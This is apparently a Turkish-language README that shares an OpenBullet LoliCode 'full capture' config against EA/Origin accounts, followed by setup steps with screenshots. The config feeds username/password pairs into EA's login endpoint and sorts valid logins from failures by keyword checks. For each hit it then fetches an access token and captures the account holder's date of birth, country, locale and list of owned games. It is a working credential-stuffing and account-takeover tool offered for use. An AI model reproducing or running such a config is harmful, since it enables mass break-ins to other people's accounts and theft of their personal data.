#  :computer: APİ - ORİGİN Full Capture Config :computer:

# İçindekiler
### Config Loli Code
### .svb nasıl kullanılır
### lolicode nasıl kullanılır
----------
# Loli Code
FUNCTION GetRandomUA BROWSER Chrome -> VAR "UA" 

FUNCTION URLEncode "<USER>" -> VAR "U" 

FUNCTION URLEncode "<PASS>" -> VAR "P" 

REQUEST GET "https://accounts.ea.com/connect/auth?response_type=code&client_id=ORIGIN_SPA_ID&display=originXWeb/login&locale=en_US&release_type=prod&redirect_uri=https://www.origin.com/views/login.html" 
  
  HEADER "Host: accounts.ea.com" 
  HEADER "Connection: keep-alive" 
  HEADER "User-Agent: <UA>" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
  HEADER "Sec-Fetch-Site: cross-site" 
  HEADER "Sec-Fetch-Mode: navigate" 
  HEADER "Sec-Fetch-User: ?1" 
  HEADER "Sec-Fetch-Dest: document" 
  HEADER "Referer: https://www.origin.com/rus/en-us/store" 
  HEADER "Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7" 
  HEADER "Accept-Encoding: gzip, deflate" 

PARSE "<ADDRESS>" LR "" "" -> VAR "URL" 

FUNCTION Length "email=<U>&password=<P>&_eventId=submit&cid=HTtEqf6SmlCUSNcg4Uea8TTfxhfiyDfw&showAgeUp=true&googleCaptchaResponse=&thirdPartyCaptchaResponse=&_rememberMe=on&rememberMe=on" -> VAR "len" 

REQUEST POST "<ADDRESS>" 
  CONTENT "email=<U>&password=<P>&_eventId=submit&cid=HTtEqf6SmlCUSNcg4Uea8TTfxhfiyDfw&showAgeUp=true&googleCaptchaResponse=&thirdPartyCaptchaResponse=&_rememberMe=on&rememberMe=on" 
  CONTENTTYPE "application/x-www-form-urlencoded" 
  HEADER "Host: signin.ea.com" 
  HEADER "Connection: keep-alive" 
  HEADER "Cache-Control: max-age=0" 
  HEADER "Origin: https://signin.ea.com" 
  HEADER "User-Agent: <UA>" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
  HEADER "Sec-Fetch-Site: same-origin" 
  HEADER "Sec-Fetch-Mode: navigate" 
  HEADER "Sec-Fetch-User: ?1" 
  HEADER "Sec-Fetch-Dest: document" 
  HEADER "Referer: <ADDRESS>" 
  HEADER "Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7" 
  HEADER "Accept-Encoding: gzip, deflate" 
  HEADER "Content-Length: <len>" 

KEYCHECK 
  KEYCHAIN Failure OR 
    KEY "class=\"otkinput-errormsg otkc\"" 
    KEY "Your credentials are incorrect or have expired. Please try again or reset your password." 
    KEY "Your credentials are incorrect or have expired." 
  KEYCHAIN Success AND 
    KEY "latestSuccessLogin" 
    KEY "<COOKIES(webun)>" EqualTo "<USER>" 
    KEY "<COOKIES(_nx_mpcid)>" Exists 

#FID PARSE "<SOURCE>" LR "window.location = \"" "\";" -> VAR "FID" 

REQUEST GET "<FID>" 
  
  HEADER "Host: accounts.ea.com" 
  HEADER "Connection: keep-alive" 
  HEADER "Upgrade-Insecure-Requests: 1" 
  HEADER "DNT: 1" 
  HEADER "User-Agent: <UA>" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
  HEADER "Sec-Fetch-Site: same-site" 
  HEADER "Sec-Fetch-Mode: navigate" 
  HEADER "Sec-Fetch-User: ?1" 
  HEADER "Sec-Fetch-Dest: document" 
  HEADER "Referer: <URL>" 
  HEADER "Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7" 
  HEADER "Cookie: _nx_mpcid=47e353ca-79ad-442c-8cf7-cde889adb49d" 
  HEADER "Accept-Encoding: gzip, deflate" 

REQUEST GET "https://accounts.ea.com/connect/auth?client_id=ORIGIN_JS_SDK&response_type=token&redirect_uri=nucleus:rest&prompt=none&release_type=prod" 
  
  HEADER "Host: accounts.ea.com" 
  HEADER "Connection: keep-alive" 
  HEADER "User-Agent: <UA>" 
  HEADER "DNT: 1" 
  HEADER "Accept: */*" 
  HEADER "Origin: https://www.origin.com" 
  HEADER "Sec-Fetch-Site: cross-site" 
  HEADER "Sec-Fetch-Mode: cors" 
  HEADER "Sec-Fetch-Dest: empty" 
  HEADER "Referer: https://www.origin.com/usa/en-us/profile/achievements" 
  HEADER "Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7" 
  HEADER "Accept-Encoding: gzip, deflate" 

#TOKEN PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN" 

REQUEST GET "https://gateway.ea.com/proxy/identity/pids/me" 
  
  HEADER "Host: gateway.ea.com" 
  HEADER "Connection: keep-alive" 
  HEADER "X-Include-UnderAge: true" 
  HEADER "User-Agent: <UA>" 
  HEADER "DNT: 1" 
  HEADER "Authorization: Bearer <TOKEN>" 
  HEADER "X-Extended-Pids: true" 
  HEADER "Accept: */*" 
  HEADER "Origin: https://www.origin.com" 
  HEADER "Sec-Fetch-Site: cross-site" 
  HEADER "Sec-Fetch-Mode: cors" 
  HEADER "Sec-Fetch-Dest: empty" 
  HEADER "Referer: https://www.origin.com/usa/en-us/profile/achievements" 
  HEADER "Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7" 
  HEADER "Accept-Encoding: gzip, deflate" 

PARSE "<SOURCE>" JSON "pidId" -> VAR "PID" 

PARSE "<SOURCE>" JSON "dob" -> CAP "Date of birth" 

PARSE "<SOURCE>" JSON "country" -> CAP "COUNTRY" 

PARSE "<SOURCE>" JSON "language" CreateEmpty=FALSE -> CAP "language" 

PARSE "<SOURCE>" JSON "locale" CreateEmpty=FALSE -> CAP "locale" 

REQUEST GET "https://api2.origin.com/ecommerce2/consolidatedentitlements/<PID>?machine_hash=1" 
  
  HEADER ": scheme: https" 
  HEADER "accept: application/vnd.origin.v3+json; x-cache/force-write" 
  HEADER "accept-encoding: gzip, deflate, br" 
  HEADER "accept-language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7" 
  HEADER "authtoken: <TOKEN>" 
  HEADER "cache-control: no-cache" 
  HEADER "dnt: 1" 
  HEADER "origin: https://www.origin.com" 
  HEADER "pragma: no-cache" 
  HEADER "referer: https://www.origin.com/gbr/en-us/profile/games" 
  HEADER "sec-fetch-dest: empty" 
  HEADER "sec-fetch-mode: cors" 
  HEADER "sec-fetch-site: same-site" 
  HEADER "user-agent: <UA>" 

FUNCTION CountOccurrences "offerPath" "<SOURCE>" -> CAP "Total Games" 

PARSE "<SOURCE>" JSON "offerPath" Recursive=TRUE CreateEmpty=FALSE -> CAP "Games" 

KEYCHECK BanOnToCheck=FALSE 
  KEYCHAIN Custom "CUSTOM" OR 
    KEY "<Games>" EqualTo "[]" 
    KEY "<Games>" DoesNotExist 
    KEY "<Total Games>" EqualTo "0" 

FUNCTION Constant "! AstatiN" -> CAP "Config By" 

--------------------------------------------------
  

# .SVB Nasıl Kullanılır

<img src="https://imgyukle.com/f/2022/06/10/VSAU7N.png" alt="image" width="1092" height="678" data-is360="0" data-load="full" class="" style="width: 432px; height: 268.22px;">

## Open Folder Butonuna Basınız Sonrasında Açılan Düğmeye .svb Dosyasını Atıp
<img src="https://imgyukle.com/f/2022/06/10/VSAbE6.png" alt="image" width="1108" height="701" data-is360="0" data-load="full" class="" style="width: 432px; height: 273.314px;">

## Rescan dümesine basarak confige tıklayarak kullana bilirsiniz


# Loli Code Nasıl Kullanılır ?

<img src="https://imgyukle.com/f/2022/06/10/VS0y40.png" alt="image" width="687" height="691" data-is360="0" data-load="full" class="cursor-zoom-out" style="width: 432px; height: 434.515px; display: block;">

## Switch To Loliscript'e Tıklayınız

<img src="https://imgyukle.com/f/2022/06/10/VSApGS.png" alt="image" width="702" height="692" data-is360="0" data-load="full" class="cursor-zoom-in" style="width: 459.546px; height: 453px;">

## Buraya Verilen Kodları Yapıştırın Ardından

<img src="https://imgyukle.com/f/2022/06/10/VSAz8t.png" alt="image" width="702" height="679" data-is360="0" data-load="full" class="cursor-zoom-in" style="width: 432px; height: 417.846px; display: block;">
tekrardan switch to loliscripte tıklayarak kaydettikten sonra configi kullana bilirsiniz

# Yazı @AstatiN
